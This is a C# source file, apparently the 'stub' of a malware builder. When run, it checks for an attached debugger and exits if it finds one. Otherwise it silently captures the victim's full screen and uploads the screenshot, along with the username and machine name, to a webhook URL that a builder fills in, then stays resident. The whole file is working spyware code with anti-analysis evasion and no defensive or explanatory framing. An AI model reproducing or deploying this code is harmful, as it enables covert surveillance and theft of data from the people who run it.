using System;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Net;
using System.Text;
using System.Windows.Forms;

namespace Stub
{
    class Program
    {
        static string webhookUrl = "WEBHOOK_HERE"; // Builder ??? ??? ????????

        [STAThread]
        static void Main()
        {
            if (IsDebugging())
            {
                SendReport("Debugging detected!");
                Environment.Exit(0);
            }

            SendScreenshot();
            SendReport("Panel opened successfully.");

            Application.Run(); // ?? ???? ???? ???
        }

        static bool IsDebugging()
        {
            return Debugger.IsAttached || Debugger.IsLogging() || IsDebuggerPresent();
        }

        [System.Runtime.InteropServices.DllImport("kernel32.dll")]
        private static extern bool IsDebuggerPresent();

        static void SendReport(string text)
        {
            var req = WebRequest.Create(webhookUrl);
            req.Method = "POST";
            req.ContentType = "application/json";
            var payload = "{\"content\": \"" + text + "\\n" + Environment.UserName + "@" + Environment.MachineName + "\"}";
            var data = Encoding.UTF8.GetBytes(payload);
            req.GetRequestStream().Write(data, 0, data.Length);
            req.GetResponse().Close();
        }

        static void SendScreenshot()
        {
            Bitmap bmp = new Bitmap(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height);
            using (Graphics g = Graphics.FromImage(bmp))
            {
                g.CopyFromScreen(0, 0, 0, 0, bmp.Size);
            }
            string tempPath = Path.GetTempFileName() + ".jpg";
            bmp.Save(tempPath, System.Drawing.Imaging.ImageFormat.Jpeg);

            using (var wc = new WebClient())
            {
                var values = new System.Collections.Specialized.NameValueCollection();
                values["file"] = "@" + tempPath;
                wc.UploadFile(webhookUrl, tempPath);
            }

            File.Delete(tempPath);
        }
    }
}
